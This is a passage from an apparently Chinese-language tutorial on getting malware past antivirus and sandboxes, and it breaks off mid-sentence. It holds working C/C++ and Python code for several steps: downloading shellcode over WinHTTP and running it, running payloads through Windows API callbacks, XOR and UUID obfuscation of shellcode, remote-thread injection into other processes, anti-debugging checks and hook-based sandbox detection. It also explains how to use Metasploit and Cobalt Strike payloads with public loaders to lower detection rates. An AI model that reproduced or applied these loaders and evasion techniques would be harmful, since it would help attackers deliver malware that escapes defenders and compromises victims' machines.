//\u7136\u540e\u5c31\u662f\u5bf9Mptr\u8fd9\u6bb5\u533a\u57df\u8fdb\u884c\u6267\u884c\uff0c\u5982((void(*)())exec)()\u6216\u521b\u5efa\u7ebf\u7a0b\u6267\u884c\u7b49 HTTP\u534f\u8bae\u8fdc\u7a0b\u8bfb\u53d6shellcode \u8fd9\u6b21\u6211\u4eec\u4e0d\u628ashellcode\u5199\u6b7b\u5728\u7a0b\u5e8f\u4e4b\u4e2d\uff0c\u800c\u662f\u901a\u8fc7\u7a0b\u5e8f\u53d1\u8d77http\u8bf7\u6c42\u5411\u5916\u754c\u83b7\u5f97shellcode\u5e76\u6267\u884c\u3002 \u8fd9\u91cc\u6d89\u53ca\u5230winhttp.h\u7684\u4e00\u4e9b\u51fd\u6570\u7684\u4f7f\u7528\u3002 \u6e90\u7801\u501f\u7528\u4e00\u4e0b \u537f \u7684\u4ee3\u7801\u3002\u5b83\u7684\u4ee3\u7801\u662f\u76f4\u63a5\u628ashellcode\u7684\u5341\u516d\u8fdb\u5236\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u76f4\u63a5\u653e\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u3002\u50cf\u8fd9\u6837 #include <string> #include <iostream> #include <windows.h> #include <winhttp.h> #pragma comment(lib,\"winhttp.lib\") #pragma comment(lib,\"user32.lib\") using namespace std; void main() { DWORD dwSize = 0; DWORD dwDownloaded = 0; LPSTR pszOutBuffer = NULL; HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL; BOOL bResults = FALSE; hSession = WinHttpOpen(L\"User-Agent\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); if (hSession) { hConnect = WinHttpConnect(hSession, L\"127.0.0.1\", INTERNET_DEFAULT_HTTP_PORT, 0); } if (hConnect) { hRequest = WinHttpOpenRequest(hConnect, L\"POST\", L\"qing.txt\", L\"HTTP/1.1\", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); } LPCWSTR header = L\"Content-type: application/x-www-form-urlencoded/r/n\"; SIZE_T len = lstrlenW(header); WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD); if (hRequest) { std::string data = \"name=host&sign=xx11sad\"; const void *ss = (const char *)data.c_str(); bResults = WinHttpSendRequest(hRequest, 0, 0, const_cast<void *>(ss), data.length(), data.length(), 0); ////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 ); } if (bResults) { bResults = WinHttpReceiveResponse(hRequest, NULL); } if (bResults) { do { // Check for available data. dwSize = 0; if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) { printf(\"Error %u in WinHttpQueryDataAvailable.\\n\", GetLastError()); break; } if (!dwSize) break; pszOutBuffer = new char[dwSize + 1]; if (!pszOutBuffer) { printf(\"Out of memory\\n\"); break; } ZeroMemory(pszOutBuffer, dwSize + 1); if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) { printf(\"Error %u in WinHttpReadData.\\n\", GetLastError()); } else { printf(\"ok\"); } //char ShellCode[1024]; int code_length = strlen(pszOutBuffer); char* ShellCode = (char*)calloc(code_length /2 , sizeof(unsigned char)); for (size_t count = 0; count < code_length / 2; count++){ sscanf(pszOutBuffer, \"%2hhx\", &ShellCode[count]); pszOutBuffer += 2; } printf(\"%s\", ShellCode); //strcpy(ShellCode,pszOutBuffer); void *exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, ShellCode, sizeof ShellCode); ((void(*)())exec)(); delete[] pszOutBuffer; if (!dwDownloaded) break; } while (dwSize > 0); } if (hRequest) WinHttpCloseHandle(hRequest); if (hConnect) WinHttpCloseHandle(hConnect); if (hSession) WinHttpCloseHandle(hSession); system(\"pause\"); } \u5927\u81f4\u6d41\u7a0b\u4fbf\u662f: 1.\u901a\u8fc7winhttp\u4e2d\u7684\u51fd\u6570\uff0c\u4ee5HTTP\u7684\u65b9\u6cd5\u83b7\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684shellcode\uff08\u6b64\u65f6shellcode\u5728\u5185\u5b58\u4e2d\u662f\u6309\u7167\u7f16\u7801\u7ed3\u679c\u5b58\u50a8\u7684\uff0c\u5982\u4e0b\u56fe\uff0c\u5de6\u8fb9\u662f\u5185\u5b58\u539f\u6587\uff0c\u53f3\u8fb9\u662f\u5185\u5b58\u89e3\u7801\uff08shellcode\uff09\uff09 2.\u5f00\u8f9f\u4e00\u6bb5\u5185\u5b58\uff0c\u7136\u540e\u901a\u8fc7sscanf\u7b49\u65b9\u6cd5\u8bfb\u53d6\u5b58\u50a8shellcode\u53d8\u91cf\u7684\u5185\u5bb9\uff0c\u5c06\u5185\u5b58\u89e3\u7801\u4fe1\u606f\u5f55\u5165\u65b0\u7684\u5185\u5b58\u7a7a\u95f4,\u4f7fshellcode\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d 3.\u6267\u884cshellcode\uff0c\u53ef\u4ee5\u7528\u6307\u9488\u6267\u884c\u7b49\u65b9\u6cd5\u6267\u884c\u3002 \u4f7f\u7528\u56de\u8c03\u51fd\u6570\u52a0\u8f7dshellcode windows API\u4e2d\u6709\u5f88\u591a\u652f\u6301\u56de\u8c03\u51fd\u6570\u7684API\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u6b64\u7c7bAPI\u5e76\u5728\u7528\u4f5c\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u4e2d\u4f20\u5165shellcode\uff0c\u5728API\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u540e\u4fbf\u4f1a\u6267\u884c\u5b83\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5bf9\u4e8e\u6211\u4eec\u5c31\u662f\u8bf4\u6267\u884c\u6211\u4eec\u7684shellcode\u3002 \u4e3e\u51e0\u4e2a\u4f8b\u5b50 sc\u662f\u6307\u5411shellcode\u533a\u57df\u7684\u6307\u9488 EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)sc, LGRPID_INSTALLED, NULL); ImmEnumInputContext(0, (IMCENUMPROC)sc, 1); \u4e5f\u633a\u597d\u627e\u7684\uff0c\u5728\u5fae\u8f6f\u6587\u6863\u4e0a\u76f4\u63a5\u641cCALLBACK\u5c31\u80fd\u641c\u5230\u4e00\u5927\u5806\u56de\u8c03\u51fd\u6570\u3002 \u6211\u5728ropgadget\u535a\u5ba2\u4e0a\u4e5f\u5ad6\u5230\u4e86\u4e00\u4e9b\u3002 AddClusterNode BluetoothRegisterForAuthentication CMTranslateRGBsExt CallWindowProcA CallWindowProcW CreateCluster CreateDialogIndirectParamA CreateDialogIndirectParamW CreateDialogParamA CreateDialogParamW CreatePrintAsyncNotifyChannel CreateTimerQueueTimer DavRegisterAuthCallback DbgHelpCreateUserDump DbgHelpCreateUserDumpW DdeInitializeA DdeInitializeW DestroyCluster DialogBoxIndirectParamA DialogBoxIndirectParamW DialogBoxParamA DialogBoxParamW DirectSoundCaptureEnumerateA DirectSoundCaptureEnumerateW DirectSoundEnumerateA DirectSoundEnumerateW DrawStateA DrawStateW EnumCalendarInfoA EnumCalendarInfoW EnumChildWindows EnumDateFormatsA EnumDateFormatsW EnumDesktopWindows EnumDesktopsA EnumDesktopsW EnumEnhMetaFile EnumFontFamiliesA EnumFontFamiliesExA EnumFontFamiliesExW EnumFontFamiliesW EnumFontsA EnumFontsW EnumICMProfilesA EnumICMProfilesW EnumLanguageGroupLocalesA EnumLanguageGroupLocalesW EnumMetaFile EnumObjects EnumPropsExA EnumPropsExW EnumPwrSchemes EnumResourceLanguagesA EnumResourceLanguagesExA EnumResourceLanguagesExW EnumResourceLanguagesW EnumResourceNamesA EnumResourceNamesExA EnumResourceNamesExW EnumResourceNamesW EnumResourceTypesA EnumResourceTypesW EnumResourceTypesExA EnumResourceTypesExW EnumResourceTypesW EnumSystemCodePagesA EnumSystemCodePagesW EnumSystemLanguageGroupsA EnumSystemLanguageGroupsW EnumSystemLocalesA EnumSystemLocalesW EnumThreadWindows EnumTimeFormatsA EnumTimeFormatsW EnumUILanguagesA EnumUILanguagesW EnumWindowStationsA EnumWindowStationsW EnumWindows EnumerateLoadedModules EnumerateLoadedModulesEx EnumerateLoadedModulesExW EventRegister GetApplicationRecoveryCallback GrayStringA GrayStringW KsCreateFilterFactory KsMoveIrpsOnCancelableQueue KsStreamPointerClone KsStreamPointerScheduleTimeout LineDDA MFBeginRegisterWorkQueueWithMMCSS MFBeginUnregisterWorkQueueWithMMCSS MFPCreateMediaPlayer MQReceiveMessage MQReceiveMessageByLookupId NotifyIpInterfaceChange NotifyStableUnicastIpAddressTable NotifyTeredoPortChange NotifyUnicastIpAddressChange PerfStartProvider PlaExtractCabinet ReadEncryptedFileRaw RegisterApplicationRecoveryCallback RegisterForPrintAsyncNotifications RegisterServiceCtrlHandlerExA RegisterServiceCtrlHandlerExW RegisterWaitForSingleObject RegisterWaitForSingleObjectEx SHCreateThread SHCreateThreadWithHandle SendMessageCallbackA SendMessageCallbackW SetTimerQueueTimer SetWinEventHook SetWindowsHookExA SetWindowsHookExW SetupDiRegisterDeviceInfo SymEnumLines SymEnumLinesW SymEnumProcesses SymEnumSourceLines SymEnumSourceLinesW SymEnumSymbols SymEnumSymbolsForAddr SymEnumSymbolsForAddrW SymEnumSymbolsW SymEnumTypes SymEnumTypesByName SymEnumTypesByNameW SymEnumTypesW SymEnumerateModules SymEnumerateModules64 SymEnumerateSymbols SymEnumerateSymbols64 SymEnumerateSymbolsW SymSearch SymSearchW TranslateBitmapBits WPUQueryBlockingCallback WdsCliTransferFile WdsCliTransferImage WinBioCaptureSampleWithCallback WinBioEnrollCaptureWithCallback WinBioIdentifyWithCallback WinBioLocateSensorWithCallback WinBioRegisterEventMonitor WinBioVerifyWithCallback WlanRegisterNotification WriteEncryptedFileRaw WsPullBytes WsPushBytes WsReadEnvelopeStart WsRegisterOperationForCancel WsWriteEnvelopeStart mciSetYieldProc midiInOpen midiOutOpen mixerOpen mmioInstallIOProcA mmioInstallIOProcW waveInOpen waveOutOpen \u4f7f\u7528\u52a0\u8f7d\u5668\u52a0\u8f7dshellcode shellcode_ launcher \u52a0\u8f7d\u5668 https://github.com/clinicallyinane/shellcode_launcher/ \u7528msf\u6216\u8005cs\u751f\u6210raw\u5f62\u5f0fshellcode\uff0c\u7136\u540e\u4f7f\u7528\u8fd9\u4e2a\u52a0\u8f7d\u5668\u52a0\u8f7d\u4e00\u4e0b\u5c31\u884c\u4e86. \u50cf\u8fd9\u6837 shellcode_launcher.exe -i C:\\payload32.bin shellcode_ launcher \u5728virustotal\u4e0a\u62a5\u6bd2\u7387\u4e5f\u662f\u5f88\u9ad8\u5f88\u9ad8\u4e86\u2026 SSI \u52a0\u8f7d\u5668 https://github.com/DimopoulosElias/SimpleShellcodeInjector cs\u751f\u6210c\u5f62\u5f0fshellcode\uff0c\u7136\u540e\u53bb\u9664\\x\uff0c\u518d\u62ff\u7ed9ssi\u52a0\u8f7d\u5668\u52a0\u8f7d,\u50cf\u8fd9\u6837 ssi.exe shellcode \u5373\u53ef\u5b8c\u6210\u52a0\u8f7d ssi\u5728virustotal\u4e0a\u62a5\u6bd2\u7387\u4e5f\u662f\u975e\u5e38\u9ad8.. \u81ea\u5199\u52a0\u8f7d\u5668 ssi\u6e90\u7801\u5f88\u7b80\u5355\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003\u5199\u4e00\u4e0b shellcode\u53d8\u5f62 \u5927\u601d\u8def\u5c31\u662f\u628ashellcode\u6df7\u6dc6\u540e\uff0c\u653e\u5165\u52a0\u8f7d\u5668\u52a0\u8f7d\u8fd0\u884c\u3002 \u5176\u7ec6\u5206\u601d\u8def\u5c31\u5305\u62ec\u600e\u4e48\u628ashellcode\u8fdb\u884c\u6df7\u6dc6\u4e86\uff0c\u7b80\u5355\u7684\u6709XOR,BASE64\uff0c\u590d\u6742\u4e00\u70b9\u7684\u6709AES\u7b49\u3002 \u8fd9\u91cc\u5c31\u53ea\u8bf4\u8bf4xor\u3002 \u9996\u5148\u6211\u4eec\u5f97\u51c6\u5907\u4e00\u4e2a\u7a0b\u5e8f\u5c06shellcode\u8fdb\u884c\u6df7\u6dc6\u3002\u56fe\u65b9\u4fbf\u5c31\u62ffpython\u5199\u4e5f\u662f\u86ee\u4e0d\u9519\u7684\u3002 \u968f\u4fbf\u5199\u4e86\u4e00\u4e2a\u3002\u6548\u679c\u771f\u4e0d\u6233\uff08\u867d\u7136\u4e0a\u4f20\u4e86vt\u8fc7\u4e24\u5929\u5c31\u80af\u5b9a\u4e0d\u80fd\u7528\u4e86) github: https://github.com/ConsT27/SimpleXORshellcode UUID\u53d8\u5f62 \u53ef\u4ee5\u628ashellcode\u53d8\u5f62\u4e3aUUID\uff0c\u8981\u7528\u7684\u65f6\u5019\u518d\u53d8\u56de\u6765\u3002 \u76f8\u5173API\u6709 RPC_STATUS UuidFromString( RPC_CSTR StringUuid, UUID *Uuid ); \u529f\u80fd\uff1a\u5c06\u5b57\u7b26\u4e32UUID\u8f6c\u6362\u4e3aUUID\u7ed3\u6784\u3002 RPC_STATUS UuidCreate( UUID *Uuid ); \u529f\u80fd\uff1a\u521b\u5efaUUID\u7ed3\u6784\u3002 int UuidEqual( UUID *Uuid1, UUID *Uuid2, RPC_STATUS *Status ); \u529f\u80fd\uff1a\u5224\u65ad\u4e24\u4e2aUUID\u662f\u5426\u76f8\u7b49\u3002 \u8fd9\u91cc\u501f\u7528\u503e\u7487\u7684UUID\u751f\u6210\u811a\u672c\u6765\u751f\u4ea7shellcode\u5bf9\u5e94\u7684UUID from uuid import UUID import os import sys # Usage: python3 binToUUIDs.py shellcode.bin [--print] print(\"\"\" ____ _ _______ _ _ _ _ _____ _____ | _ \\(_) |__ __| | | | | | | |_ _| __ \\ | |_) |_ _ __ | | ___ | | | | | | | | | | | | |___ | _ <| | '_ \\| |/ _ \\| | | | | | | | | | | | / __| | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \\__ \\ |____/|_|_| |_|_|\\___/ \\____/ \\____/|_____|_____/|___/ \\n\"\"\") with open(sys.argv[1], \"rb\") as f: bin = f.read() if len(sys.argv) > 2 and sys.argv[2] == \"--print\": outputMapping = True else: outputMapping = False offset = 0 print(\"Length of shellcode: {} bytes\\n\".format(len(bin))) out = \"\" while(offset < len(bin)): countOfBytesToConvert = len(bin[offset:]) if countOfBytesToConvert < 16: ZerosToAdd = 16 - countOfBytesToConvert byteString = bin[offset:] + (b'\\x00'* ZerosToAdd) uuid = UUID(bytes_le=byteString) else: byteString = bin[offset:offset+16] uuid = UUID(bytes_le=byteString) offset+=16 out += \"\\\"{}\\\",\\n\".format(uuid) if outputMapping: print(\"{} -> {}\".format(byteString, uuid)) with open(sys.argv[1] + \"UUIDs\", \"w\") as f: f.write(out) print(\"Outputted to: {}\".format(sys.argv[1] + \"UUIDs\")) \u7136\u540e\u5b9e\u9645\u52a0\u8f7d\u5668\u6587\u4ef6\u4e3a #pragma comment(lib,\"Rpcrt4.lib\") int main(int argc, char* argv[]) { const char * buf[] = { \"0089e8fc-0000-8960-e531-d2648b52308b\", \"528b0c52-8b14-2872-0fb7-4a2631ff31c0\", \"7c613cac-2c02-c120-cf0d-01c7e2f05257\", \"8b10528b-3c42-d001-8b40-7885c0744a01\", }; const int num = sizeof(buf) / sizeof(buf[0]); HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0); if (hMemory == NULL) { return -1; } PVOID pMemory = HeapAlloc(hMemory, 0, 2048); DWORD_PTR CodePtr = (DWORD_PTR)pMemory; for (int i = 0; i < num; i++) { RPC_STATUS status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr); CodePtr += 16; } DWORD dwThreadId = 0; HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pMemory, NULL, NULL, &dwThreadId); WaitForSingleObject(hThread, INFINITE); } shellcode\u6ce8\u5165\u8fdb\u7a0b\u5185\u5b58 \u6ce8\u5165\u5df2\u6709\u8fdb\u7a0b \u5927\u81f4\u903b\u8f91:OpenProcess\u83b7\u5f97\u8fdb\u7a0b\u53e5\u67c4->VirtualAllocEx\u5728\u8fdb\u7a0b\u4e2d\u5f00\u8f9f\u4e00\u6bb5\u5185\u5b58\u7a7a\u95f4->WriteProcessMemory\u5411\u521a\u521a\u5f00\u8f9f\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u5199\u5165shellcode->CreateRemoteThread\u4e3a\u521a\u521a\u5199\u5165\u7684shellcode\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c #include <iostream> #include<Windows.h> int main() { unsigned char buf[] = \"shellcode\"; DWORD pid = 25388; HANDLE Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (!Proc) { std::cout << GetLastError() << std::endl; } LPVOID buffer = VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); if (buffer) { std::cout << GetLastError() << std::endl; } if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) ){ std::cout << GetLastError() << std::endl; } HANDLE remotethread = CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0); } \u6548\u679c:\u867d\u7136\u4e5f\u5f88\u62c9\uff0c\u4f46\u662f\u9759\u6001\u8fc7\u4e86\u8d8b\u52bf\u662f\u6211\u6ca1\u60f3\u5230\u7684\u3002 \u53cd\u8c03\u8bd5 \u53ef\u4ee5\u901a\u8fc7\u53cd\u8c03\u8bd5\u6765\u89c4\u907f\u6740\u8f6f\u68c0\u6d4b\uff0c\u62d6\u6162\u9006\u5411\u5de5\u7a0b\u5e08\u5206\u6790\u901f\u5ea6\uff0c\u4f46\u4e5f\u6709\u53ef\u80fd\u63d0\u9ad8\u88ab\u5224\u4e3a\u6076\u610f\u6587\u4ef6\u7684\u6982\u7387\u3002 \u76f4\u63a5\u5224\u65ad\u662f\u5426\u4e3a\u8c03\u8bd5\u72b6\u6001 if (IsDebuggerPresent()) return FALSE; PPEB pPEB = (PPEB)__readgsqword(0x60); if (pPEB->BeingDebugged) return; BOOL ret; CheckRemoteDebuggerPresent(GetCurrentProcess(), &ret); return ret; NtQueryInformationProcess \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u83b7\u53d6\u67d0\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002 \u9700\u8981\u52a8\u6001\u94fe\u63a5\u5e93 #pragma comment(lib,\"ntdll\") \u5f53\u7136\u4e5f\u53ef\u4ee5\u7528GetProcAddress\u52a8\u6001\u83b7\u53d6\u8fd9\u4e2a\u51fd\u6570\u3002 \u8fd9\u4e2a\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u8fdb\u7a0b\u53e5\u67c4\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u7ed3\u6784\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u83b7\u53d6\u8fd4\u56de\u503c\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u662f\u8fd4\u56de\u503c\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u7b2c\u4e94\u4e2a\u586bNULL \u5176\u4e2d\u4e0e\u53cd\u8c03\u8bd5\u6709\u5173\u7684\u6210\u5458\u6709ProcessDebugPort(0x7)\u3001ProcessDebugObjectHandle(0x1E)\u548cProcessDebugFlags(0x1F) ProcessDebugPort\u53c2\u6570\uff0c\u82e5\u6ca1\u5728\u8c03\u8bd5\u4e2d\uff0c\u5219\u8be5\u51fd\u6570\u8fd4\u56de0\uff0c\u82e5\u5728\u8c03\u8bd5\u4e2d\u5219\u8fd4\u56de\u5bf9\u5e94\u7684\u8c03\u8bd5\u7aef\u53e3 \u5176\u4ed6\u53c2\u6570\u4e5f\u7c7b\u4f3c \u770b\u96ea\u4e0ahoujingyi\u5e08\u5085\u7684\u6f14\u793a\u4ee3\u7801 BOOL CheckDebug() { int debugPort = 0; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 0x7, &debugPort, sizeof(debugPort), NULL); return debugPort != 0; } BOOL CheckDebug() { HANDLE hdebugObject = NULL; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &hdebugObject, sizeof(hdebugObject), NULL); return hdebugObject != NULL; } BOOL CheckDebug() { BOOL bdebugFlag = TRUE; HMODULE hModule = LoadLibrary(\"Ntdll.dll\"); NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, \"NtQueryInformationProcess\"); NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &bdebugFlag, sizeof(bdebugFlag), NULL); return bdebugFlag != TRUE; } \u68c0\u6d4b\u8f6f\u4ef6\u65ad\u70b9 \u5f53\u6211\u4eec\u5728\u8c03\u8bd5\u5668\u4e2d\u5bf9\u4e00\u884c\u4ee3\u7801\u6253\u4e0a\u65ad\u70b9\u65f6\uff0c\u5b9e\u8d28\u4e0a\u662f\u5c06\u8fd9\u884c\u4ee3\u7801\u6539\u4e3a\u4e860xcc\uff0c\u5373INT 3\uff0c\u4e2d\u65ad\u5f02\u5e38\uff0c\u6240\u4ee5\u8c03\u8bd5\u5668\u8fd0\u884c\u5230\u6b64\u5904\u65f6\u4f1a\u505c\u6b62\u3002 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u68c0\u6d4b\u4ee3\u7801\u4e2d\u662f\u5426\u67090xcc\u6765\u5224\u65ad\u662f\u5426\u88ab\u6253\u4e0a\u4e86\u8f6f\u4ef6\u65ad\u70b9\uff0c\u4ece\u800c\u8d77\u5230\u53cd\u8c03\u8bd5\u7684\u4f5c\u7528\u3002 \u8981\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u4f7f\u7528\u6c47\u7f16\u4ee3\u7801\u4e2d\u7684 repne scasb \u6307\u4ee4\uff0c\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u7f13\u51b2\u533a\u7684\u8d77\u59cb\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5339\u914d\u7684\u5b57\u7b26\u4e32\u3002\u5b83\u4f1a\u5728\u6307\u5b9a\u7684\u7f13\u51b2\u533a\u5185\u5bfb\u627e\u5b57\u7b26\u4e32\uff0c\u82e5\u6ca1\u6709\u627e\u5230\u5219\u8fd4\u56de. \u65f6\u95f4\u68c0\u6d4b int t1 = GetTickCount64(); Hack(); //\u4e00\u4e2a\u51fd\u6570\uff0c\u8bf1\u5bfc\u5206\u6790\u4eba\u5458\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u8ddf\u8fdb\u8fdb\u53bb\u803d\u8bef\u65f6\u95f4 int t2 = GetTickCount64(); if (((t2 - t1) / 1000) > 5) { return FALSE; } //t1,t2\u68c0\u6d4b\u65f6\u95f4\u8fc7\u5927\u5219\u4f1a\u662f\u8c03\u8bd5 wprintf_s(L\"Now hacking more...\\n\"); \u4e5f\u53ef\u4ee5\u7528\u5185\u8054\u6c47\u7f16\u5b8c\u6210 BOOL CheckDebug() { DWORD time1, time2; __asm { rdtsc mov time1, eax ........\u5783\u573e\u4ee3\u7801\uff0c\u803d\u8bef\u5206\u6790\u4eba\u5458\u65f6\u95f4 rdtsc mov time2, eax } if (time2 - time1 < 0xff) { return FALSE; } else { return TRUE; } } \u68c0\u6d4b\u7236\u8fdb\u7a0b \u89c1\u6c99\u7bb1\u7ed5\u8fc7\u7ae0\u8282\u4e2d\u7684\u201c\u68c0\u6d4b\u7236\u8fdb\u7a0b\u201d SEH\u4e2d\u65ad \u4e0d\u662f\u5f88\u61c2 void AD_BreakPoint() { printf(\"SEH : BreakPoint\\n\"); __asm { // install SEH push handler push DWORD ptr fs:[0] mov DWORD ptr fs:[0], esp // generating exception int 3 // 1) debugging // go to terminating code mov eax, 0xFFFFFFFF jmp eax // process terminating!!! // 2) not debugging // go to normal code handler: mov eax, dword ptr ss:[esp+0xc] mov ebx, normal_code mov dword ptr ds:[eax+0xb8], ebx xor eax, eax retn normal_code: // remove SEH pop dword ptr fs:[0] add esp, 4 } printf(\" => Not debugging...\\n\\n\"); } int _tmain(int argc, TCHAR* argv[]) { AD_BreakPoint(); return 0; } \u6c99\u7bb1\u7ed5\u8fc7\uff08Sandbox Evasion\uff09 System Checks \u68c0\u6d4b\u5f53\u524d\u73af\u5883\u662f\u5426\u662f\u6c99\u7bb1\u73af\u5883\uff0c\u5982\u679c\u662f\u6c99\u7bb1\u5219\u4e0d\u8868\u73b0\u51fa\u6076\u610f\u884c\u4e3a\u3002 \u68c0\u6d4b\u51fd\u6570\u662f\u5426\u88abHOOK\u66f4\u6539 \u6709\u4e9b\u6c99\u7bb1\u4f1a\u5bf9\u4e00\u4e9b\u51fd\u6570\u8fdb\u884cHOOK\u66f4\u6539\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u539fDLL\u4e2d\u67e5\u627e\u539f\u51fd\u6570\u4e0e\u8fdb\u7a0b\u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u6bd4\u5bf9\u4ece\u800c\u5224\u65ad\u5176\u662f\u5426\u88abHOOK. \u8fd9\u91cc\u662f\u522b\u4eba\u7684\u4ee3\u7801(RedTeaming) // manually load the dll HANDLE dllFile = CreateFileW(L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); DWORD dllFileSize = GetFileSize(dllFile, NULL); HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL); HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0); CloseHandle(dllFile); // analyze the dll PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew); PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader); PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions); PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames); PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals); // find the original function code PVOID pNtCreateThreadExOriginal = NULL; for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) { PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]); if (!strcmp(pFunctionName, \"NtCreateThreadEx\")) { pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]); break; } } // compare functions PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L\"ntdll.dll\"), \"NtCreateThreadEx\"); if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false; GetTickCount GetTickCount \u662fwin32 API\u4e4b\u4e00\uff0c\u7528\u6765\u8bb0\u5f55\u7535\u8111\u5f00\u673a\u540e\u7684\u8fd0\u884c\u65f6\u95f4\uff08\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff09 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u68c0\u6d4b\u5f53\u524d\u73af\u5883\u7684\u8fd0\u884c\u65f6\u95f4\uff0c\u5982\u679c\u65f6\u95f4\u5f88\u77ed\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u662f\u6c99\u7bb1\u3002 \u4e3a\u4ec0\u4e48\u65f6\u95f4\u5f88\u77ed\u5c31\u53ef\u80fd\u662f\u6c99\u7bb1\u73af\u5883\u5462\uff1f\u6c99\u7bb1\u5bf9\u6076\u610f\u7a0b\u5e8f\u7684\u68c0\u6d4b\u6d41\u7a0b\u5927\u81f4\u5982\u4e0b 1.\u542f\u52a8\u865a\u62df\u73af\u5883 2.\u5c06\u6076\u610f\u7a0b\u5e8f\u590d\u5236\u8fdb\u865a\u62df\u73af\u5883 